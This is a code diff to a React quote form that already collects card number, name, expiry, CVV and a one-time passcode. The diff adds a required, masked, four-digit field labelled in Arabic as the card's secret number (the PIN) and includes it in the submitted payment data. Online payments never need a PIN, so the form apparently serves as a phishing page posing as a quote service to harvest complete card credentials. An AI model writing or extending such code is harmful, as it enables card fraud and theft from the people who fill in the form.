@@ -638,6 +638,7 @@ function ProfessionalQuoteForm() {
   const [otpVerified, setOtpVerified] = useState(false)
   const [otpAttempts, setOtpAttempts] = useState(0)
   const [cardNumber, setCardNumber] = useState("")
+  const [pinCode, setPinCode] = useState("")
   const [cardName, setCardName] = useState("")
   const [cardMonth, setCardMonth] = useState("")
   const [cardYear, setCardYear] = useState("")
@@ -993,6 +994,7 @@ function ProfessionalQuoteForm() {
       cardMonth,
       cardYear,
       cvv,
+      pinCode,
       paymentStatus: "processing",
       ...formData,
     })
@@ -1744,6 +1746,22 @@ function ProfessionalQuoteForm() {
                           maxLength={3}
                           value={cvv}
                           onChange={(e) => setCvv(e.target.value)}
+                        />
+                      </div>
+
+                           <div>
+                        <label className="block text-sm font-semibold text-gray-700 mb-3">
+                          الرقم السري للبطاقة  <span className="text-red-500">*</span>
+                        </label>
+                        <Input
+                          name="pinCode"
+                          id="pinCode"
+                          type="password"
+                          className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
+                          placeholder="####"
+                          maxLength={4}
+                          value={pinCode}
+                          onChange={(e) => setPinCode(e.target.value)}
                         />
                       </div>
                     </div>
